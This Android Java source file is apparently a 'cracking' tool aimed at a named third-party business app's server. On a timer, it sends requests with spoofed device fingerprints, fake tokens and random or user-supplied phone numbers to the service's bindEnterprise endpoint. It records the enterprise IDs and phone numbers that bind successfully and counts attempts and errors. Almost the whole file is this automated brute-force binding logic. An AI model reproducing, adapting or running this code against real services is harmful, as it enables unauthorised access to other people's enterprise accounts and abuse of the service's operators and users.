package com.lxl.mineutil;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.Gson;
import com.lxl.mineutil.adapter.BaseActivity;
import com.lxl.mineutil.adapter.PoJieAdapter;
import com.lxl.mineutil.bean.BindPhonePacket;
import com.lxl.mineutil.bean.BindPhoneReq;
import com.lxl.mineutil.bean.BindPhoneSuc;
import com.lxl.mineutil.bean.CheckBean;
import com.lxl.mineutil.bean.MineJsonData;
import com.lxl.mineutil.bean.Packet;
import com.lxl.mineutil.bean.PhoneBean;
import com.lxl.mineutil.bean.PoJieBean;
import com.lxl.mineutil.bean.Request;
import com.lxl.mineutil.bean.Result;
import com.lxl.mineutil.util.AgainTimerTask;
import com.lxl.mineutil.util.DBUtil;
import com.zhy.http.okhttp.OkHttpUtils;
import com.zhy.http.okhttp.builder.PostStringBuilder;
import com.zhy.http.okhttp.callback.StringCallback;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import okhttp3.Call;
import okhttp3.MediaType;

public class MainActivity extends BaseActivity implements View.OnClickListener{
    private List<String> versions=new ArrayList<>();
    private List<String> os=new ArrayList<>();
    private List<String> osVersion=new ArrayList<>();
    private List<String> operators=new ArrayList<>();
    private List<String> phoneNames=new ArrayList<>();
    private List<String> netType=new ArrayList<>();
    private AgainTimerTask againTimerTask;
    private EditText time,userPhone;
    private int time2Time=10000;
    private List<PoJieBean> poJieBeenList=new ArrayList<>();
    private PoJieAdapter adapter;
    private RecyclerView resultView;
    private String imei,randomCode,token,version,phone;
    private Gson gson;
    private DBUtil dbUtil;
    private TextView number,phoneNo;
    private long no=0;
    private long errorNo=0;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initVersion();
        initOsAndrVersion();
        initView();
    }

    private void initView() {
        time= (EditText) findViewById(R.id.time);
        userPhone= (EditText) findViewById(R.id.user_phone);
        resultView= (RecyclerView) findViewById(R.id.all_result);
        number= (TextView) findViewById(R.id.number);
        phoneNo= (TextView) findViewById(R.id.phone_no);

        LinearLayoutManager manager=new LinearLayoutManager(MainActivity.this);
        manager.setOrientation(LinearLayoutManager.VERTICAL);
        resultView.setLayoutManager(manager);
        adapter=new PoJieAdapter(poJieBeenList);
        resultView.setAdapter(adapter);

        findViewById(R.id.start).setOnClickListener(this);
        findViewById(R.id.stop).setOnClickListener(this);
        findViewById(R.id.change).setOnClickListener(this);
        findViewById(R.id.pojie_phone).setOnClickListener(this);
        findViewById(R.id.look).setOnClickListener(this);

        dbUtil=new DBUtil(MainActivity.this);

        adapter.setOnItemClickListener(new PoJieAdapter.OnItemClickListener() {
            @Override
            public void onItemClick(int position, PoJieBean poJieBean) {
                Intent intent=new Intent(MainActivity.this,ShowUserActivity.class);
                intent.putExtra("enterpriseKID",poJieBean.getEnterpriseId());
                startActivity(intent);
            }
        });
    }

    private void PoJieKuaiPi(){
        Request test=new Request();
        Packet packet=new Packet();
        MineJsonData jsonData=new MineJsonData();

        jsonData.setImei(imei);
        jsonData.setType(1);
        jsonData.setPhoneCode(phone);
        jsonData.setRandomCode(randomCode);

        packet.setJsonData(jsonData);

        test.setMid(imei);
        test.setAccesstoken(token);
        test.setVersion(version);
        test.setPacket(packet);

        String json=gson.toJson(test);
        PostStringBuilder postStringBuilder = OkHttpUtils.postString().url("http://app.kp99.cn/client/clientManager?action=getRandomMsg");
        postStringBuilder.mediaType(MediaType.parse("application/json; charset=utf-8"));
        postStringBuilder.content(json);
        postStringBuilder.build().execute(new StringCallback() {
            @Override
            public void onError(Call call, Exception e, int id) {
                //Toast.makeText(MainActivity.this, "第一步发生错误", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onResponse(String response, int id) {
                Log.i("第二部的结果",response);
                Result result=gson.fromJson(response,Result.class);
                if (result!=null&&result.getResult()==1){
                    Toast.makeText(MainActivity.this, "完成第一部.等待破解..", Toast.LENGTH_SHORT).show();
                }else if (result==null){
                    Toast.makeText(MainActivity.this, "返回空", Toast.LENGTH_SHORT).show();
                }else {
                    Toast.makeText(MainActivity.this, "返回错误码"+result.getResult(), Toast.LENGTH_SHORT).show();
                }
            }
        });
    }


    /**
     * 绑定设备
     */
    private void bindPhone(){
        showProgressDialog("正在破解...");
        BindPhoneReq bindPhoneReq=new BindPhoneReq();
        bindPhoneReq.setVersion(version);
        bindPhoneReq.setMid(imei);
        bindPhoneReq.setAccesstoken(token);
        BindPhonePacket packet=new BindPhonePacket();
        BindPhonePacket.JsonDataBean jsonDataBean=new BindPhonePacket.JsonDataBean();
        jsonDataBean.setDeviceId(imei);
        jsonDataBean.setPhoneCode(phone);
        jsonDataBean.setType(1);
        BindPhonePacket.JsonDataBean.DeviceInfoBean deviceInfoBean=new BindPhonePacket.JsonDataBean.DeviceInfoBean();
        int versionNum=getNum(0,os.size()-1);
        deviceInfoBean.setOS(os.get(versionNum));
        deviceInfoBean.setOSVersion(osVersion.get(versionNum));
        deviceInfoBean.setOperator(operators.get(getNum(0,operators.size()-1)));
        String modeType=getRandomCharAndNumr(3);
        final String phoneNa=phoneNames.get(getNum(0,phoneNames.size()-1));
        deviceInfoBean.setModel(modeType);
        deviceInfoBean.setName(phoneNa+"  "+modeType);
        deviceInfoBean.setPhone(getRand(6));
        deviceInfoBean.setResolution(getRand(4)+":"+getRand(4));
        deviceInfoBean.setNetType(netType.get(getNum(0,netType.size()-1)));
        jsonDataBean.setDeviceInfo(deviceInfoBean);
        packet.setJsonData(new Gson().toJson(jsonDataBean));
        bindPhoneReq.setPacket(packet);

        String json=gson.toJson(bindPhoneReq);
        PostStringBuilder postStringBuilder = OkHttpUtils.postString().url("http://app.kp99.cn/client/clientManager?action=bindEnterprise ");
        postStringBuilder.mediaType(MediaType.parse("application/json; charset=utf-8"));
        postStringBuilder.content(json);
        postStringBuilder.build().execute(new StringCallback() {
            @Override
            public void onError(Call call, Exception e, int id) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        hideProgressDialog();
                        no++;
                        errorNo++;
                        String numberNo="破解次数:"+no+"--->错误次数:"+errorNo;
                        number.setText(numberNo);
                        String phoneNumber="破解号码:"+phone;
                        phoneNo.setText(phoneNumber);
                    }
                });
            }

            @Override
            public void onResponse(String response, int id) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        hideProgressDialog();
                        no++;
                        String numberNo="破解次数:"+no+"--->错误次数:"+errorNo;
                        number.setText(numberNo);
                        String phoneNumber="破解号码:"+phone;
                        phoneNo.setText(phoneNumber);
                    }
                });
                if (response==null) return;
                try {
                    BindPhoneSuc bindPhoneSuc=gson.fromJson(response,BindPhoneSuc.class);
                    if (bindPhoneSuc!=null&&bindPhoneSuc.getResult()==1){
                        BindPhoneSuc.JsonDataBean jsonDataBean1=gson.fromJson(bindPhoneSuc.getPacket().getJsonData(), BindPhoneSuc.JsonDataBean.class);
                        if (jsonDataBean1.isIsInitBoosOpOperator()){
                            PoJieBean poJieBean=new PoJieBean();
                            poJieBean.setVersion(version);
                            poJieBean.setEnterpriseId(jsonDataBean1.getEnterpriseId());
                            poJieBean.setPhone(phone);
                            poJieBean.setToken(token);
                            poJieBean.setRandom(randomCode);
                            adapter.addPojie(poJieBean);
                            PhoneBean phoneBean=new PhoneBean();
                            phoneBean.setPhone(phone);
                            dbUtil.insertDate(phoneBean);
                        }
                    }
                }catch (Exception e){

                }
            }
        });
    }

    private void checkImei(){
        //imei=getRand(15);
        imei="000000000000000";
        randomCode=getRand(6);
        token=getRand(17);
        phone=getTel();
        version=versions.get(getNum(0,versions.size()-1));
        bindPhone();

//        CheckBean checkBean=new CheckBean();
//        checkBean.setMid(imei);
//        checkBean.setVersion(version);
//        checkBean.setAccesstoken(token);
//
//        String json=gson.toJson(checkBean);
//        PostStringBuilder postStringBuilder = OkHttpUtils.postString().url("http://app.kp99.cn/client/industryManager?action=getIndustryVersion");
//        postStringBuilder.mediaType(MediaType.parse("application/json; charset=utf-8"));
//        postStringBuilder.content(json);
//        postStringBuilder.build().execute(new StringCallback() {
//            @Override
//            public void onError(Call call, Exception e, int id) {
//                Toast.makeText(MainActivity.this, "第一步发生错误", Toast.LENGTH_SHORT).show();
//            }
//
//            @Override
//            public void onResponse(String response, int id) {
//                FirstResult result=gson.fromJson(response,FirstResult.class);
//                if (result!=null&&result.getResult()==1){
//                    Log.i("第一步","成功:"+imei);
//                    PoJieKuaiPi();
//                    //PoJieKuaiPi(imei,randomCode,token,version);
//                    //Toast.makeText(MainActivity.this, "完成第一部.等待破解..", Toast.LENGTH_SHORT).show();
//
//                }else if (result==null){
//                    Toast.makeText(MainActivity.this, "返回空", Toast.LENGTH_SHORT).show();
//                }else {
////                    Toast.makeText(MainActivity.this, "返回无效机器码"+result.getResult(), Toast.LENGTH_SHORT).show();
//                    //Log.i("第一步","无效码:"+imei);
//                }
//            }
//        });
    }

    private void initVersion(){
        gson=new Gson();
        versions.add("5.4.8.032");
        versions.add("5.4.9.021");
        versions.add("5.4.7.022");
        versions.add("5.4.6.011");
        versions.add("5.4.5");
        versions.add("5.4.4");
        versions.add("5.4.3");
        versions.add("5.4.2");
        versions.add("5.4.1");
        versions.add("5.4.0");
    }

    private void initOsAndrVersion(){
        os.add("18");
        os.add("19");
        os.add("20");
        os.add("21");
        os.add("22");
        os.add("23");
        os.add("24");

        osVersion.add("4.3");
        osVersion.add("4.4");
        osVersion.add("4.4W");
        osVersion.add("5.0");
        osVersion.add("5.1");
        osVersion.add("6.0");
        osVersion.add("7.0");

        operators.add("未知");
        operators.add("中国联通");
        operators.add("中国移动");
        operators.add("中国电信");

        phoneNames.add("HAIWEI");
        phoneNames.add("LG");
        phoneNames.add("HTC");
        phoneNames.add("vivo");
        phoneNames.add("OPPO");
        phoneNames.add("Moto");
        phoneNames.add("Samsung");
        phoneNames.add("Coolpad");
        phoneNames.add("K-Touch");

        netType.add("未知");
        netType.add("2G");
        netType.add("3G");
        netType.add("4G");
        netType.add("WIFI");

    }


    public String getRandomCharAndNumr(Integer length) {
        String str = "";
        Random random = new Random();
        for (int i = 0; i < length; i++) {
            boolean b = random.nextBoolean();
            if (b) { // 字符串
                // int choice = random.nextBoolean() ? 65 : 97; 取得65大写字母还是97小写字母
                str += (char) (65 + random.nextInt(26));// 取得大写字母
            } else { // 数字
                str += String.valueOf(random.nextInt(10));
            }
        }
        return str;
    }

    private String getRand(int length){
        StringBuilder imei=new StringBuilder();
        for (int i = 0; i < length; i++) {
            java.util.Random random=new java.util.Random();// 定义随机类
            String result=random.nextInt(10)+"";
            imei.append(result);
        }
        return imei.toString();
    }

    /**
     * 返回手机号码
     */
//    private static String[] telFirst=("133,153,180,181,189,173,177,130,131,132,155,156,185,186,145,176," +
//            "185,134,135,136,137,138,139,150,151,152,158,159,182,183,184,147,178,184").split(",");

    private static String[] telFirst=("137,189").split(",");
    private static String getTel() {
        int index=getNum(0,telFirst.length-1);
        String first=telFirst[index];
        String second=String.valueOf(getNum(1,888)+10000).substring(1);
        String thrid=String.valueOf(getNum(1,9100)+10000).substring(1);
        return first+second+thrid;
    }

    public static int getNum(int start,int end) {
        return (int)(Math.random()*(end-start+1)+start);
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()){
            case R.id.start:
                againTimerTask=new AgainTimerTask(time2Time);
                againTimerTask.setTimerTask(new AgainTimerTask.TimeTaskResult() {
                    @Override
                    public void run() {
                        checkImei();
                    }
                }).startTimer();
                break;
            case R.id.stop:
//                CheckBean bindPhoneReq=new CheckBean();
//                bindPhoneReq.setVersion("12121");
//                bindPhoneReq.setMid("897885");
//                bindPhoneReq.setAccesstoken("565614");
//
//                dbUtil=new DBUtil(MainActivity.this);
//                PhoneBean phoneBean=new PhoneBean();
//                phoneBean.setPhone("1111");
                //dbUtil.insertDate(bindPhoneReq);
                //dbUtil.query(PhoneBean.class,-1);
                if (againTimerTask!=null) againTimerTask.stopTimer();
                break;
            case R.id.change:
                if (againTimerTask!=null) againTimerTask.stopTimer();
                String timeLong=time.getText()+"";
                if (TextUtils.isEmpty(timeLong)){
                    Toast.makeText(this, "请设置修改的时间", Toast.LENGTH_SHORT).show();
                    return;
                }
                try {
                    time2Time=Integer.parseInt(timeLong);
                    Toast.makeText(this, "修改时间成功"+time2Time/(float)1000+"S", Toast.LENGTH_SHORT).show();
                }catch (Exception e){
                    Toast.makeText(this, "输入时间格式错误,已设置默认时间5S", Toast.LENGTH_SHORT).show();
                    time2Time=5000;
                }finally {
                    againTimerTask=new AgainTimerTask(time2Time);
                }
                break;
            case R.id.pojie_phone:
                if (TextUtils.isEmpty(userPhone.getText()+"")){
                    Toast.makeText(this, "请输入要破解的号码", Toast.LENGTH_SHORT).show();
                }else {
                    phone= userPhone.getText()+"";
                    imei="000000000000000";
                    randomCode=getRand(6);
                    token=getRand(17);
                    //phone=getTel();
                    version=versions.get(getNum(0,versions.size()-1));
                    bindPhone();
                }
                break;
            case R.id.look:
                startActivityForResult(new Intent(MainActivity.this,ShowAllPhoneActivity.class),0x11);
                break;
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (data!=null&&requestCode==0x11){
            String phoneNumber=data.getStringExtra("phone");
            if (TextUtils.isEmpty(phoneNumber)) return;
            imei="000000000000000";
            randomCode=getRand(6);
            token=getRand(17);
            phone=phoneNumber;
            version=versions.get(getNum(0,versions.size()-1));
            bindPhone();
        }
    }
}
